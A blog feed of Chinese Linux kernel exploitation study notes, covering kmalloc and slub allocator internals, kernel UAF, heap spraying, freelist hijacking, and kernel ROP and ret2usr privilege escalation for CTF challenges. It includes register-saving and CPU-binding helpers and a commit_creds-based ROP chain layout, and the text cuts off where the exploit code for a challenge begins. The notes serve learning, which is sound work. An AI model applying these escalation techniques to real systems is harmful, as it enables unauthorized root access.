title="kmalloc"></a>kmalloc</h2><p>kmalloc的内存分配就是基于slab分配器，在系统启动初期调用create_kmalloc_caches ()创建多个管理不同大小对象的kmem_cache，例如：8B、16B、32B、64B、…、64MB等大小。当然默认配置情况下，系统系统启动之后创建的最大size的kmem_cache是kmalloc-8192。因此，通过slab接口分配的最大内存是8192 bytes。那么通过kmalloc接口申请的内存大于8192 bytes该怎么办呢？其实kmalloc会判断申请的内存是否大于8192 bytes，如果大于的话就会通过alloc_pages接口申请内存。kmem_cache的名称以及大小使用struct kmalloc_info_struct管理。所有管理不同大小对象的kmem_cache的名称如下： </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">kmalloc_info_struct</span> <span class="title">kmalloc_info</span>[] __<span class="title">initconst</span> =</span> &#123; </span><br><span class="line">    &#123;<span class="literal">NULL</span>,                        <span class="number">0</span>&#125;,     &#123;<span class="string">&quot;kmalloc-96&quot;</span>,             <span class="number">96</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;kmalloc-192&quot;</span>,           <span class="number">192</span>&#125;,     &#123;<span class="string">&quot;kmalloc-8&quot;</span>,               <span class="number">8</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;kmalloc-16&quot;</span>,             <span class="number">16</span>&#125;,     &#123;<span class="string">&quot;kmalloc-32&quot;</span>,             <span class="number">32</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;kmalloc-64&quot;</span>,             <span class="number">64</span>&#125;,     &#123;<span class="string">&quot;kmalloc-128&quot;</span>,           <span class="number">128</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;kmalloc-256&quot;</span>,           <span class="number">256</span>&#125;,     &#123;<span class="string">&quot;kmalloc-512&quot;</span>,           <span class="number">512</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;kmalloc-1024&quot;</span>,         <span class="number">1024</span>&#125;,     &#123;<span class="string">&quot;kmalloc-2048&quot;</span>,         <span class="number">2048</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;kmalloc-4096&quot;</span>,         <span class="number">4096</span>&#125;,     &#123;<span class="string">&quot;kmalloc-8192&quot;</span>,         <span class="number">8192</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;kmalloc-16384&quot;</span>,       <span class="number">16384</span>&#125;,     &#123;<span class="string">&quot;kmalloc-32768&quot;</span>,       <span class="number">32768</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;kmalloc-65536&quot;</span>,       <span class="number">65536</span>&#125;,     &#123;<span class="string">&quot;kmalloc-131072&quot;</span>,     <span class="number">131072</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;kmalloc-262144&quot;</span>,     <span class="number">262144</span>&#125;,     &#123;<span class="string">&quot;kmalloc-524288&quot;</span>,     <span class="number">524288</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;kmalloc-1048576&quot;</span>,   <span class="number">1048576</span>&#125;,     &#123;<span class="string">&quot;kmalloc-2097152&quot;</span>,   <span class="number">2097152</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;kmalloc-4194304&quot;</span>,   <span class="number">4194304</span>&#125;,     &#123;<span class="string">&quot;kmalloc-8388608&quot;</span>,   <span class="number">8388608</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;kmalloc-16777216&quot;</span>, <span class="number">16777216</span>&#125;,     &#123;<span class="string">&quot;kmalloc-33554432&quot;</span>, <span class="number">33554432</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;kmalloc-67108864&quot;</span>, <span class="number">67108864</span>&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>经过create_kmalloc_caches ()函数之后，系统通过create_kmalloc_cache()创建以上不同size的kmem_cache，并将这些kmem_cache存储在kmalloc_caches全局变量中以备后续kmalloc分配内存。现在假如通过kmalloc(17, GFP_KERNEL)申请内存，系统会从名称“kmalloc-32”管理的slab缓存池中分配一个对象。即使浪费了15Byte。</p><p>我们来看看kmalloc的实现方式。 </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *<span class="title function_">kmalloc</span><span class="params">(<span class="type">size_t</span> size, <span class="type">gfp_t</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (__builtin_constant_p(size)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (size &gt; KMALLOC_MAX_CACHE_SIZE)</span><br><span class="line">            <span class="keyword">return</span> kmalloc_large(size, flags);</span><br><span class="line">        <span class="keyword">if</span> (!(flags &amp; GFP_DMA)) &#123;</span><br><span class="line">            <span class="type">int</span> index = kmalloc_index(size);</span><br><span class="line">            <span class="keyword">if</span> (!index)</span><br><span class="line">                <span class="keyword">return</span> ZERO_SIZE_PTR;</span><br><span class="line">            <span class="keyword">return</span> kmem_cache_alloc_trace(kmalloc_caches[index], flags, size);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> __kmalloc(size, flags);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>1) __builtin_constant_p是gcc工具用来判断参数是否是一个常数，毕竟有些操作对于常数来说是可以优化的。<br>2) 通过kmalloc_index函数查找符合满足分配大小的最小kmem_cache。<br>3) 将index作为下表从kmalloc_caches数组中找到符合的kmem_cache，并从slab缓存池中分配对象。</p><p>再看一下kmalloc_index的实现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">int</span> <span class="title function_">kmalloc_index</span><span class="params">(<span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!size)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;= KMALLOC_MIN_SIZE)</span><br><span class="line">        <span class="keyword">return</span> KMALLOC_SHIFT_LOW;</span><br><span class="line">    <span class="keyword">if</span> (KMALLOC_MIN_SIZE &lt;= <span class="number">32</span> &amp;&amp; size &gt; <span class="number">64</span> &amp;&amp; size &lt;= <span class="number">96</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (KMALLOC_MIN_SIZE &lt;= <span class="number">64</span> &amp;&amp; size &gt; <span class="number">128</span> &amp;&amp; size &lt;= <span class="number">192</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=          <span class="number">8</span>) <span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=         <span class="number">16</span>) <span class="keyword">return</span> <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=         <span class="number">32</span>) <span class="keyword">return</span> <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=         <span class="number">64</span>) <span class="keyword">return</span> <span class="number">6</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=        <span class="number">128</span>) <span class="keyword">return</span> <span class="number">7</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=        <span class="number">256</span>) <span class="keyword">return</span> <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=        <span class="number">512</span>) <span class="keyword">return</span> <span class="number">9</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=       <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=   <span class="number">2</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">11</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=   <span class="number">4</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">12</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=   <span class="number">8</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">13</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=  <span class="number">16</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">14</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=  <span class="number">32</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">15</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=  <span class="number">64</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">16</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;= <span class="number">128</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">17</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;= <span class="number">256</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">18</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;= <span class="number">512</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">19</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;= <span class="number">1024</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">20</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=  <span class="number">2</span> * <span class="number">1024</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">21</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=  <span class="number">4</span> * <span class="number">1024</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">22</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=  <span class="number">8</span> * <span class="number">1024</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">23</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=  <span class="number">16</span> * <span class="number">1024</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">24</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=  <span class="number">32</span> * <span class="number">1024</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">25</span>;</span><br><span class="line">    <span class="keyword">if</span> (size &lt;=  <span class="number">64</span> * <span class="number">1024</span> * <span class="number">1024</span>) <span class="keyword">return</span> <span class="number">26</span>;</span><br><span class="line">    <span class="comment">/* Will never be reached. Needed because the compiler may complain */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><h2 id="更多分配函数"><a href="#更多分配函数" class="headerlink" title="更多分配函数"></a>更多分配函数</h2><h3 id="kmalloc-1"><a href="#kmalloc-1" class="headerlink" title="kmalloc"></a>kmalloc</h3><p>kmalloc申请的虚拟内存地址位于<code>direct mapping of all physical memory</code>物理内存映射区域，在物理上连续，与真实物理地址的差值为一个定值，存在简单的转换关系，申请大小不能超过128kb</p><h3 id="kzalloc"><a href="#kzalloc" class="headerlink" title="kzalloc"></a>kzalloc</h3><p>kzalloc = kmalloc + 清空内存(置0)</p><h3 id="vmalloc"><a href="#vmalloc" class="headerlink" title="vmalloc"></a>vmalloc</h3><p>vmalloc() 函数则会在虚拟内存空间给出一块连续的内存区，但这片连续的虚拟内存在物理内存中并不一定连续。由于 vmalloc() 没有保证申请到的是连续的物理内存，因此对申请的内存大小没有限制，如果需要申请较大的内存空间就需要用此函数了。</p><h3 id="get-free-pages"><a href="#get-free-pages" class="headerlink" title="__get_free_pages:"></a>__get_free_pages:</h3><p>于kmalloc一样，申请的虚拟地址位于<code>direct mapping of all physical memory</code>区域，是提供给调用者最底层的内存分配函数，基于<code>buddy system</code>实现，同样是连续的物理内存。分配粒度为页</p><h1 id="个解"><a href="#个解" class="headerlink" title="个解"></a>个解</h1><p>暂时还没抽出空去深入学习源码,根据调试以及部分源码总结部分自以为是这样的东西(源码随版本变化比较大,以下基于v5.4.262)</p><ol><li><p>一个kmem_cache结构体可以认为是一个slab分配器的核心,或者可以较为偏颇的认为一个kmem_cache结构体便是slab分配器</p><p>横向对比ptmalloc堆管理器的话,kmem_cache类似于malloc_state结构体,不同的kmem_cache有不同的名字(e.g.kmalloc-8,kmalloc-192),就像malloc_state的实例也有不同的区分main_arena,thread_arena</p></li><li><p>kmem_cache中有一个slab_cpu成员,其指向当前运行cpu核心中的kmem_cache_cpu结构体,其可能会随着当前运行cpu核心的改变而改变(?未证实),每一个kmem_cache都在所有cpu核心中各有一个kmem_cache_spu结构体实例</p><ul><li><p>page成员对我造成了不少困惑,在gdb调试时查看kmem_cache_cpu变量时,发现freelist和page指向的地址竟然不在同一页,甚至相差十分远,在我看到的大多数对slub的介绍中这两个都被认为是应该指向同一个页(至少是附近)</p><p>freelist指向的肯定是没有问题的,确实是所有obeject所在地,所以问题就是page结构体指针的问题了,于是对照着page指针的地址在linux源码给出的内存映射布局中找到了答案</p><p><code>ffffea0000000000 |  -22    TB | ffffeaffffffffff |    1 TB | virtual memory map (vmemmap_base)</code></p><p>是的,虽然struct page结构体确实是位于物理页但是在虚拟地址映射之后,肯定不可能将page结构体依然保存在原属物理页,<u>因此内核专门提供一块内存用于存放所有被映射的物理页的struct page结构体</u></p><p>percpu中的page结构体指针就是指向此处</p></li></ul></li><li><p>kmem_cache另一个十分重要的成员叫做node[MAX_NUMNODES],是一个数组,每一个数组成员都指向一个节点中的kmem_cache_node结构体,每个节点都存在所有kmem_cache结构体对应的kmem_cache_node,但其实大多数时候也就只有一个节点</p></li><li><p>同时调试也可以发现,kmem_cache,kmem_cache_node以及用于分配的slab都是位于</p><p><code>ffff888000000000 | -119.5  TB | ffffc87fffffffff |   64 TB | direct mapping of all physical memory (page_offset_base)</code></p><p>物理页直接映射区中</p></li></ol><h1 id="Heap-Exploitation"><a href="#Heap-Exploitation" class="headerlink" title="Heap Exploitation"></a>Heap Exploitation</h1><h2 id="kernel-UAF"><a href="#kernel-UAF" class="headerlink" title="kernel UAF"></a>kernel UAF</h2><p>UAF 即 Use After Free，通常指的是<strong>对于释放后未重置的垂悬指针的利用</strong>，此前在用户态下的 heap 阶段对于 ptmalloc 的利用很多都是基于 UAF 漏洞进行进一步的利用。</p><p>在 CTF 当中，内核的 <u>“堆内存” 主要指的是直接映射区</u>（direct mapping area），常用的分配函数 <u>kmalloc</u> 从此处分配内存，常用的分配器为 slub，若是在 kernel 中存在着垂悬指针，我们同样可以以此完成对 slab/slub 内存分配器的利用，通过 Kernel UAF 完成提权。</p><h3 id="内核堆利用与绑核"><a href="#内核堆利用与绑核" class="headerlink" title="内核堆利用与绑核"></a>内核堆利用与绑核</h3><p>slub allocator 会优先从当前核心的 <code>kmem_cache_cpu</code> 中进行内存分配，在多核架构下存在多个 <code>kmem_cache_cpu</code> ，由于进程调度算法会保持核心间的负载均衡，因此我们的 exp 进程可能会被在不同的核心上运行，这也就导致了利用过程中 kernel object 的分配有可能会来自不同的 <code>kmem_cache_cpu</code> ，这使得利用模型变得复杂，也降低了漏洞利用的成功率。</p><blockquote><p>比如说你在 core 0 上整了个 double free，准备下一步利用时 exp 跑到 core 1 去了</p></blockquote><p>因此为了保证漏洞利用的稳定，<strong>我们需要将我们的进程绑定到特定的某个 CPU 核心上</strong>，这样 slub allocator 的模型对我们而言便简化成了 <code>kmem_cache_node + kmem_cache_cpu</code> ，我们也能更加方便地进行漏洞利用。</p><p>wiki给出的一个模板是:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* to run the exp on the specific core only */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_cpu</span><span class="params">(<span class="type">int</span> core)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="通用-kmalloc-flag"><a href="#通用-kmalloc-flag" class="headerlink" title="通用 kmalloc flag"></a>通用 kmalloc flag</h3><p><code>GFP_KERNEL</code> 与 <code>GFP_KERNEL_ACCOUNT</code> 是内核中最为<u>常见与通用的分配 flag</u>，常规情况下他们的分配都来自同一个 <code>kmem_cache</code> ——即通用的 <code>kmalloc-xx</code> ,其中<code>xx</code>一般是数字字符</p><p>这两种 flag 的区别主要在于 <code>GFP_KERNEL_ACCOUNT</code> 比 <code>GFP_KERNEL</code> 多了一个属性——<strong>表示该对象与来自用户空间的数据相关联</strong>，因此我们可以看到诸如 <code>msg_msg</code> 、<code>pipe_buffer</code>、<code>sk_buff的数据包</code> 的分配使用的都是 <code>GFP_KERNEL_ACCOUNT</code> ，而 <code>ldt_struct</code> 、<code>packet_socket</code> 等与用户空间数据没有直接关联的结构体则使用 <code>GFP_KERNEL</code>。</p><p>在 5.9 版本之前<code>GFP_KERNEL</code> 与 <code>GFP_KERNEL_ACCOUNT</code> 存在隔离机制，在 <a href="https://github.com/torvalds/linux/commit/10befea91b61c4e2c2d1df06a2e978d182fcf792">这个 commit</a> 中取消了隔离机制，自内核版本 5.14 起，在 <a href="https://github.com/torvalds/linux/commit/494c1dfe855ec1f70f89552fce5eadf4a1717552">这个 commit</a> 当中又重新引入：</p><ul><li>对于开启了 <code>CONFIG_MEMCG_KMEM</code> 编译选项的 kernel 而言（通常都是默认开启），其会为使用 <code>GFP_KERNEL_ACCOUNT</code> 进行分配的通用对象<strong>创建一组独立的 <code>kmem_cache</code> ——名为 <code>kmalloc-cg-</code></strong> ，从而导致使用这两种 flag 的 object 之间的隔离。</li></ul><h3 id="slub-合并-amp-隔离"><a href="#slub-合并-amp-隔离" class="headerlink" title="slub 合并 &amp; 隔离"></a>slub 合并 &amp; 隔离</h3><p>slab alias 机制是一种对<u>同等/相近</u>大小 object 的 <code>kmem_cache</code> 进行<strong>复用</strong>的一种机制：</p><ul><li>当一个 <code>kmem_cache</code> 在创建时，若<u>已经存在</u>能分配相等 / 近似大小的 object 的 <code>kmem_cache</code> ，则<strong>不会创建新的 kmem_cache，而是为原有的 kmem_cache 起一个 alias，作为 “新的” kmem_cache 返回</strong>。</li></ul><p>例如，<code>cred_jar</code> 是专门用以分配 <code>cred</code> 结构体的 <code>kmem_cache</code>，在 Linux 4.4 之前的版本中，其为 <code>kmalloc-192</code> 的 alias，即 cred 结构体与其他的 192 大小的 object 都会从同一个 <code>kmem_cache</code>——<code>kmalloc-192</code> 中分配。</p><p>对于初始化时设置了 <strong><u><em>SLAB_ACCOUNT</em></u></strong> 这一 flag 的 <code>kmem_cache</code> 而言，则会<u>新建一个新的</u> <code>kmem_cache</code> 而非为原有的建立 alias，如在新版的内核当中 <code>cred_jar</code> 与 <code>kmalloc-192</code> 便是两个独立的 <code>kmem_cache</code>，<strong>彼此之间互不干扰</strong>。</p><h3 id="例题：CISCN2017-babydriver"><a href="#例题：CISCN2017-babydriver" class="headerlink" title="例题：CISCN2017 - babydriver"></a>例题：CISCN2017 - babydriver</h3><h2 id="Heap-Spray"><a href="#Heap-Spray" class="headerlink" title="Heap Spray"></a>Heap Spray</h2><p><strong>堆喷射</strong>（heap spraying）指的是一种辅助攻击手法：「<strong>通过大量分配相同的结构体来达成某种特定的内存布局</strong>，从而帮助攻击者完成后续的利用过程」，常见于如下场景：</p><ul><li>你有一个 UAF，但是<strong>你无法通过少量内存分配拿到该结构体</strong>（例如该 object 不属于当前 freelist 且释放后会回到 node 上，或是像 <code>add_key()</code> 那样会被一直卡在第一个临时结构体上），这时你可以<strong>通过堆喷射来确保拿到该 object</strong>。</li><li>你有一个堆溢出读 / 写，但是<strong>堆布局对你而言是不可知的</strong>（比如说开启了 <code>SLAB_FREELIST_RANDOM</code>（默认开启）），你可以<strong>预先喷射大量特定结构体，从而保证对其中某个结构体的溢出</strong>。</li><li>……</li></ul><p>作为一种辅助的攻击手法，堆喷射可以被应用在多种场景下。</p><h2 id="freelist-劫持"><a href="#freelist-劫持" class="headerlink" title="freelist 劫持"></a>freelist 劫持</h2><p>与用户态 glibc 中分配 fake chunk 后覆写 <code>__free_hook</code> 这样的手法类似，我们同样可以通过覆写 freelist 中的 next 指针的方式完成内核空间中任意地址上的对象分配，并修改内核当中一些有用的数据以完成提权（例如一些函数表等）。</p><h2 id="Cross-Cache-Overflow-amp-Page-level-Heap-Fengshui"><a href="#Cross-Cache-Overflow-amp-Page-level-Heap-Fengshui" class="headerlink" title="Cross-Cache Overflow &amp; Page-level Heap Fengshui"></a>Cross-Cache Overflow &amp; Page-level Heap Fengshui</h2>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kernel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kernel学习笔记3</title>
      <link href="/posts/62744/"/>
      <url>/posts/62744/</url>
      
        <content type="html"><![CDATA[<h1 id="Returned-Oriented-Programming"><a href="#Returned-Oriented-Programming" class="headerlink" title="Returned Oriented Programming"></a>Returned Oriented Programming</h1><h2 id="Kernel-ROP"><a href="#Kernel-ROP" class="headerlink" title="Kernel ROP"></a>Kernel ROP</h2><p><strong>内核态的 ROP 与用户态的 ROP 一般无二，只不过利用的 gadget 变成了内核中的 gadget，所需要构造执行的 ropchain 由</strong> <code>system(&quot;/bin/sh&quot;)</code> <strong>变为了</strong> <code>commit_creds(&amp;init_cred)</code> 或 <code>commit_creds(prepare_kernel_cred(NULL))</code>，当我们成功地在内核中执行这样的代码后，当前线程的 cred 结构体便变为 init 进程的 cred 的拷贝，我们也就获得了 root 权限，此时在用户态起一个 shell 便能获得 root shell。</p><h3 id="状态保存"><a href="#状态保存" class="headerlink" title="状态保存"></a>状态保存</h3><p>通常情况下，我们的 exploit 需要进入到内核当中完成提权，而我们最终仍然需要<strong>着陆回用户态</strong>以获得一个 root 权限的 shell，因此在我们的 exploit 进入内核态之前我们需要<strong>手动模拟用户态进入内核态的准备工作</strong>——<strong>保存各寄存器的值到内核栈上</strong>，以便于后续着陆回用户态。</p><p>通常情况下使用如下函数保存各寄存器值到我们自己定义的变量中，以便于构造 rop 链：</p><blockquote><p>算是一个通用的 pwn 板子。</p><p>方便起见，使用了内联汇编，编译时需要指定参数：<code>-masm=intel</code>。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">saveStatus</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="返回用户态"><a href="#返回用户态" class="headerlink" title="返回用户态"></a>返回用户态</h3><p>由内核态返回用户态只需要：</p><ul><li><code>swapgs</code>指令恢复用户态 GS 寄存器</li><li><code>sysretq</code>或者<code>iretq</code>恢复到用户空间</li></ul><p>那么我们只需要在内核中找到相应的 gadget 并执行<code>swapgs;iretq</code>就可以成功着陆回用户态。</p><p>通常来说，我们应当构造如下 rop 链以返回用户态并获得一个 shell：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">↓   swapgs</span><br><span class="line">    iretq</span><br><span class="line">    user_shell_addr</span><br><span class="line">    user_cs</span><br><span class="line">    user_eflags //64bit user_rflags</span><br><span class="line">    user_sp</span><br><span class="line">    user_ss</span><br></pre></td></tr></table></figure><h3 id="swapgs"><a href="#swapgs" class="headerlink" title="swapgs"></a>swapgs</h3><p>交换内核态与用户态的gs寄存器</p><h3 id="iretq-amp-amp-sysretq"><a href="#iretq-amp-amp-sysretq" class="headerlink" title="iretq&amp;&amp;sysretq"></a>iretq&amp;&amp;sysretq</h3><p>这两个指令都是用于返回用户态</p><p>其中iretq等效</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pop rip</span><br><span class="line">pop cs</span><br><span class="line">pop rflags</span><br><span class="line">pop rsp</span><br><span class="line">pop ss</span><br></pre></td></tr></table></figure><p>sysretq则等效</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pop rip</span><br></pre></td></tr></table></figure><h3 id="例题：强网杯-2018-core"><a href="#例题：强网杯-2018-core" class="headerlink" title="例题：强网杯 2018 - core"></a>例题：强网杯 2018 - core</h3><h2 id="ret2usr"><a href="#ret2usr" class="headerlink" title="ret2usr"></a>ret2usr</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p><strong>在【未】开启 SMAP/SMEP 保护的情况下</strong>，用户空间无法访问内核空间的数据，但是内核空间可以访问 / 执行用户空间的数据，因此 <code>ret2usr</code> 这种攻击手法应运而生——通过 kernel ROP 以内核的 ring 0 权限执行用户空间的代码以完成提权。</p><p>通常 CTF 中的 ret2usr 还是以执行<code>commit_creds(prepare_kernel_cred(NULL))</code>进行提权为主要的攻击手法，不过相比起构造冗长的 ROP chain，ret2usr 只需我们要提前在用户态程序构造好对应的函数指针、获取相应函数地址后直接 ret 回到用户空间执行即可。</p><p>对于开启了<code>SMAP/SMEP保护</code>的 kernel 而言，<strong>内核空间尝试直接访问用户空间会引起 kernel panic</strong>，我们将在下篇讲述其绕过方式。</p><h3 id="例题：2018-强网杯-core"><a href="#例题：2018-强网杯-core" class="headerlink" title="例题：2018 强网杯 - core"></a>例题：2018 强网杯 - core</h3><p>具体的这里就不再重复分析了，由于其未开启 smap/smep 保护，故可以考虑在<strong>用户地址空间中构造好对应的函数指针后直接 ret2usr 以提权</strong>，我们只需要将代码稍加修改即可。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span 